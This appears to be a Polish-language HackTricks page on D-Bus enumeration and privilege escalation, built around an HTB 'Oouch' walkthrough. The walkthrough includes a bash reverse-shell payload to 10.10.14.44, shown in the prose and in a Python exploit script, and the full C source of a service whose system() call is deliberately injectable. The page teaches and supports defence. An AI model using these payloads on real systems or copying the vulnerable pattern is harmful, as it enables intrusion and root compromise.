# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus jest wykorzystywany jako mediator komunikacji międzyprocesowej (IPC) w środowiskach Ubuntu desktop. W Ubuntu obserwuje się równoległe działanie kilku message buses: system bus, używany głównie przez **privileged services do udostępniania usług istotnych dla całego systemu**, oraz session bus dla każdego zalogowanego użytkownika, udostępniający usługi istotne wyłącznie dla tego konkretnego użytkownika. Skupiamy się tutaj przede wszystkim na system bus ze względu na jego powiązanie z usługami działającymi z wyższymi uprawnieniami (np. root), ponieważ naszym celem jest privilege escalation. Zauważa się, że architektura D-Bus wykorzystuje osobny 'router' dla każdego session bus, którego zadaniem jest przekierowywanie komunikatów klienta do odpowiednich usług na podstawie adresu wskazanego przez klientów dla usługi, z którą chcą się komunikować.

Usługi w D-Bus są definiowane przez **objects** i **interfaces**, które udostępniają. Obiekty można porównać do instancji klas w standardowych językach OOP, przy czym każda instancja jest jednoznacznie identyfikowana przez **object path**. Ta ścieżka, podobna do ścieżki systemu plików, jednoznacznie identyfikuje każdy obiekt udostępniany przez usługę. Kluczowym interfejsem do badań jest **org.freedesktop.DBus.Introspectable**, zawierający pojedynczą metodę Introspect. Metoda ta zwraca reprezentację XML obsługiwanych przez obiekt metod, sygnałów i właściwości, przy czym tutaj skupiamy się na metodach, pomijając properties i signals.

Do komunikacji z interfejsem D-Bus użyto dwóch narzędzi: narzędzia CLI o nazwie **gdbus** do łatwego wywoływania metod udostępnianych przez D-Bus w skryptach oraz [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), narzędzia GUI opartego na Pythonie, zaprojektowanego do wyliczania usług dostępnych na każdym busie oraz wyświetlania obiektów zawartych w każdej usłudze.
```bash
sudo apt-get install d-feet
```
Jeśli sprawdzasz **session bus**, najpierw potwierdź aktualny adres:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Na pierwszym obrazie pokazano usługi zarejestrowane w system bus D-Bus, z **org.debin.apt** wyróżnioną po wybraniu przycisku System Bus. D-Feet odpytuje tę usługę o obiekty, wyświetlając interfejsy, metody, właściwości i sygnały dla wybranych obiektów, jak widać na drugim obrazie. Podany jest też podpis każdej metody.

Ważną funkcją jest wyświetlanie **process ID (pid)** usługi oraz **command line**, co jest przydatne do potwierdzenia, czy usługa działa z podwyższonymi uprawnieniami, co ma znaczenie dla relewancji badawczej.

**D-Feet umożliwia też wywoływanie metod**: użytkownicy mogą wprowadzać wyrażenia Python jako parametry, a D-Feet konwertuje je na typy D-Bus przed przekazaniem do usługi.

Zwróć jednak uwagę, że **niektóre metody wymagają uwierzytelnienia** przed umożliwieniem ich wywołania. Zignorujemy te metody, ponieważ naszym celem jest podniesienie uprawnień bez credentials od samego początku.

Zwróć też uwagę, że niektóre z usług odpytują inną usługę D-Bus o nazwie org.freedeskto.PolicyKit1, czy użytkownik powinien mieć pozwolenie na wykonanie określonych działań, czy nie.

## **Cmd line Enumeration**

### List Service Objects

Możliwe jest wyświetlenie otwartych interfejsów D-Bus za pomocą:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Usługi oznaczone jako **`(activatable)`** są szczególnie interesujące, ponieważ **jeszcze nie działają**, ale żądanie na busie może uruchomić je na żądanie. Nie zatrzymuj się na `busctl list`; przypisz te nazwy do rzeczywistych binariów, które wykonałyby.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
To szybko pokazuje, jaka ścieżka `Exec=` zostanie uruchomiona dla aktywowalnej nazwy i pod jaką tożsamością. Jeśli binary lub jego łańcuch wykonania są słabo chronione, nieaktywna service nadal może stać się ścieżką privilege-escalation.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Gdy proces ustanawia connection do bus, bus przypisuje do connection specjalną nazwę bus zwaną _unique connection name_. Nazwy bus tego typu są niezmienne — gwarantowane jest, że nie zmienią się tak długo, jak connection istnieje — i, co ważniejsze, nie mogą być ponownie użyte w czasie życia bus. Oznacza to, że żadna inna connection do tego bus nigdy nie otrzyma takiej unikalnej nazwy connection, nawet jeśli ten sam proces zamknie connection do bus i utworzy nową. Unikalne nazwy connection są łatwe do rozpoznania, ponieważ zaczynają się od — w innym wypadku zabronionego — znaku dwukropka.

### Service Object Info

Następnie możesz uzyskać pewne informacje o interface za pomocą:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Skoreluj również nazwę busa z jego jednostką `systemd` i ścieżką wykonywalną:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Odpowiada to na operacyjne pytanie, które ma znaczenie podczas privesc: **jeśli wywołanie metody zakończy się sukcesem, który rzeczywisty binary i unit wykona akcję?**

### Wyświetl interfejsy obiektu usługi

Musisz mieć wystarczające uprawnienia.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspekcja interfejsu obiektu usługi

Zwróć uwagę, że w tym przykładzie wybrano najnowszy interfejs wykryty przy użyciu parametru `tree` (_zobacz poprzednią sekcję_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Zwróć uwagę na metodę `.Block` interfejsu `htb.oouch.Block` (tę, która nas interesuje). „s” w pozostałych kolumnach może oznaczać, że oczekuje ona stringa.

Zanim spróbujesz czegokolwiek niebezpiecznego, najpierw zweryfikuj metodę **read-oriented** albo inną niskiego ryzyka. To jasno rozdziela trzy przypadki: błędna składnia, osiągalne, ale z odmową, albo osiągalne i dozwolone.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Skoreluj D-Bus Methods z Policies i Actions

Introspection mówi ci **co** możesz wywołać, ale nie mówi ci **dlaczego** dane wywołanie jest dozwolone albo odrzucone. Do prawdziwego privesc triage zwykle trzeba sprawdzić **trzy warstwy razem**:

1. **Activation metadata** (`.service` files lub `SystemdService=`), aby dowiedzieć się, który binary i unit faktycznie zostanie uruchomiony.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), aby dowiedzieć się, kto może `own`, `send_destination` lub `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`), aby poznać domyślny model autoryzacji (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Przydatne commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Nie zakładaj **1:1 mapping** między metodą D-Bus a akcją Polkit. Ta sama metoda może wybrać inną akcję w zależności od obiektu, który jest modyfikowany, albo od kontekstu runtime. Dlatego praktyczny workflow to:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` i grep odpowiednich plików `.policy`
3. low-risk live probes z `busctl call`, `gdbus call`, albo `dbusmap --enable-probes --null-agent`

Usługi proxy albo compatibility zasługują na szczególną uwagę. **Root-running proxy**, który forwarduje requests do innej usługi D-Bus przez własne, wcześniej ustanowione połączenie, może przypadkowo sprawić, że backend będzie traktował każde żądanie jako pochodzące z UID 0, chyba że oryginalna tożsamość caller zostanie ponownie zweryfikowana.

### Monitor/Capture Interface

Przy wystarczających uprawnieniach (same `send_destination` i `receive_sender` privileges nie wystarczą) możesz **monitor D-Bus communication**.

Aby **monitorować** **communication**, musisz być **root.** Jeśli nadal masz problemy będąc root, sprawdź [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) oraz [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Jeśli wiesz, jak skonfigurować plik konfiguracyjny D-Bus, aby **allow non root users to sniff** communication, proszę **contact me**!

Różne sposoby monitorowania:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
W następującym przykładzie interfejs `htb.oouch.Block` jest monitorowany, a **wiadomość "**_**lalalalal**_**" jest wysyłana przez miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Możesz użyć `capture` zamiast `monitor`, aby zapisać wyniki w pliku **pcapng**, który Wireshark może otworzyć:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrowanie całego szumu <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Jeśli na busie jest po prostu zbyt dużo informacji, użyj reguły dopasowania w ten sposób:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Można określić wiele reguł. Jeśli wiadomość pasuje do _którejkolwiek_ z reguł, wiadomość zostanie wyświetlona. Na przykład:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Zobacz [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html), aby uzyskać więcej informacji o składni match rule.

### More

`busctl` ma jeszcze więcej opcji, [**znajdź je wszystkie tutaj**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

Jako user **qtc wewnątrz hosta "oouch" z HTB** możesz znaleźć **nieoczekiwany plik konfiguracyjny D-Bus** znajdujący się w _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Note z poprzedniej konfiguracji, że **będziesz musiał być użytkownikiem `root` lub `www-data`, aby wysyłać i odbierać informacje** poprzez tę komunikację D-BUS.

Jako użytkownik **qtc** wewnątrz kontenera docker **aeb4525789d8** możesz znaleźć trochę kodu związanego z dbus w pliku _/code/oouch/routes.py._ To jest interesujący kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Jak widać, **łączy się z interfejsem D-Bus** i wysyła do funkcji **"Block"** wartość "client_ip".

Po drugiej stronie połączenia D-Bus działa jakiś skompilowany binarny kod C. Ten kod **nasłuchuje** na połączeniu D-Bus **na adres IP i wywołuje iptables przez funkcję `system`**, aby zablokować podany adres IP.\
**Wywołanie `system` jest celowo podatne na command injection**, więc payload taki jak poniższy utworzy reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Na końcu tej strony możesz znaleźć **pełny kod C aplikacji D-Bus**. W jego wnętrzu możesz znaleźć między liniami 91-97 **jak `D-Bus object path`** oraz **`interface name`** są **rejestrowane**. Ta informacja będzie potrzebna do wysłania danych do połączenia D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ponadto, w linii 57 można znaleźć, że **jedyna zarejestrowana metoda** dla tej komunikacji D-Bus nazywa się `Block`(_**Dlatego w następnej sekcji payloady będą wysyłane do obiektu usługi `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i nazwy metody `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Poniższy kod python wyśle payload do połączenia D-Bus do metody `Block` przez `block_iface.Block(runme)` (_uwaga: został on wyodrębniony z poprzedniego fragmentu kodu_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl i dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` to narzędzie używane do wysyłania wiadomości do “Message Bus”
- Message Bus – Oprogramowanie używane przez systemy do łatwiejszej komunikacji między aplikacjami. Jest to powiązane z Message Queue (wiadomości są uporządkowane sekwencyjnie), ale w Message Bus wiadomości są wysyłane w modelu subskrypcji i są też bardzo szybkie.
- Tagiem “-system” oznacza się, że jest to wiadomość systemowa, a nie session message (domyślnie).
- Tagiem “–print-reply” oznacza się, że nasza wiadomość ma zostać poprawnie wyświetlona, a wszelkie odpowiedzi mają być odebrane w czytelnym dla człowieka formacie.
- “–dest=Dbus-Interface-Block” Adres interfejsu Dbus.
- “–string:” – Typ wiadomości, którą chcemy wysłać do interfejsu. Istnieje kilka formatów wysyłania wiadomości, takich jak double, bytes, booleans, int, objpath. Spośród nich “object path” jest przydatny, gdy chcemy wysłać ścieżkę do pliku do interfejsu Dbus. W tym przypadku możemy użyć specjalnego pliku (FIFO), aby przekazać komendę do interfejsu pod postacią nazwy pliku. “string:;” – Służy do ponownego wywołania object path, gdzie umieszczamy plik/komendę FIFO reverse shell.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Zautomatyzowani pomocnicy do enumeracji (2023-2025)

Ręczna enumeracja dużej powierzchni ataku D-Bus za pomocą `busctl`/`gdbus` szybko staje się uciążliwa. Dwa małe narzędzia FOSS wydane w ostatnich latach mogą przyspieszyć pracę podczas red-team lub CTF:

### dbusmap ("Nmap for D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Napisany w C; pojedynczy statyczny binarny plik (<50 kB), który przechodzi po każdej ścieżce obiektu, pobiera XML `Introspect` i mapuje go do PID/UID właściciela.
* Przydatne flagi:
```bash
# Wylistuj każdą usługę na busie *system* i zrzucić wszystkie wywoływalne metody
sudo dbus-map --dump-methods

# Aktywnie testuj metody/właściwości, do których można dotrzeć bez promptów Polkit
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Narzędzie oznacza niezabezpieczone dobrze znane nazwy symbolem `!`, natychmiast ujawniając usługi, które możesz *ownić* (przejąć), albo wywołania metod dostępne z nieuprzywilejowanej powłoki.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Skrypt tylko w Pythonie, który szuka *zapisywalnych* ścieżek w jednostkach systemd **oraz** zbyt liberalnych plików polityk D-Bus (np. `send_destination="*"`).
* Szybkie użycie:
```bash
python3 uptux.py -n          # uruchom wszystkie kontrole, ale nie zapisuj pliku logu
python3 uptux.py -d          # włącz szczegółowe wyjście debug
```
* Moduł D-Bus przeszukuje poniższe katalogi i wyróżnia każdą usługę, którą normalny użytkownik może podszyć się pod nią lub przejąć:
* `/etc/dbus-1/system.d/` i `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (nadpisania producenta)

---

## Godne uwagi błędy eskalacji uprawnień D-Bus (2024-2025)

Śledzenie niedawno opublikowanych CVE pomaga wykrywać podobne niebezpieczne wzorce w niestandardowym kodzie. Dwa dobre, niedawne przykłady to:

| Rok | CVE | Komponent | Przyczyna źródłowa | Wniosek ofensywny |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Usługa działająca jako root wystawiała interfejs D-Bus, który nieuprzywilejowani użytkownicy mogli rekonfigurować, w tym ładować zachowanie makr kontrolowane przez atakującego. | Jeśli demon wystawia na busie systemowym **zarządzanie urządzeniami/profilami/konfiguracją**, traktuj zapisywalną konfigurację i funkcje makr jako prymitywy wykonania kodu, a nie tylko „ustawienia”. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Działający jako root proxy zgodności przekazywał żądania do usług backendowych bez zachowania oryginalnego kontekstu bezpieczeństwa wywołującego, więc backend ufał proxy jako UID 0. | Traktuj usługi D-Bus typu **proxy / bridge / compatibility** jako osobną klasę błędów: jeśli przekazują uprzywilejowane wywołania, sprawdź, jak UID wywołującego/kontext Polkit trafia do backendu. |

Wzorce, na które warto zwrócić uwagę:
1. Usługa działa **jako root na busie systemowym**.
2. Albo nie ma **sprawdzenia autoryzacji**, albo sprawdzenie jest wykonywane względem **złego podmiotu**.
3. Osiągalna metoda ostatecznie zmienia stan systemu: instalacja pakietów, zmiany użytkowników/grup, konfiguracja bootloadera, aktualizacje profilu urządzenia, zapisy plików lub bezpośrednie wykonanie komendy.

Użyj `dbusmap --enable-probes` albo ręcznego `busctl call`, aby potwierdzić, czy metoda jest osiągalna, a następnie przeanalizuj XML polityki usługi i akcje Polkit, aby zrozumieć **który podmiot** jest faktycznie autoryzowany.

---

## Szybkie usprawnienia hardeningu i detekcji

* Szukaj polityk z możliwością zapisu dla wszystkich lub otwartych *send/receive*:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Wymagaj Polkit dla niebezpiecznych metod – nawet proxy *root* powinny przekazywać PID *wywołującego* do `polkit_authority_check_authorization_sync()` zamiast własnego.
* Odbieraj uprawnienia w długo działających pomocnikach (użyj `sd_pid_get_owner_uid()`, aby przełączyć namespaces po połączeniu z busem).
* Jeśli nie możesz usunąć usługi, przynajmniej ogranicz ją do dedykowanej grupy Unix i zablokuj dostęp w jej polityce XML.
* Blue-team: przechwyć bus systemowy za pomocą `busctl capture > /var/log/dbus_$(date +%F).pcapng` i zaimportuj to do Wiresharka do wykrywania anomalii.

---

## Referencje

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
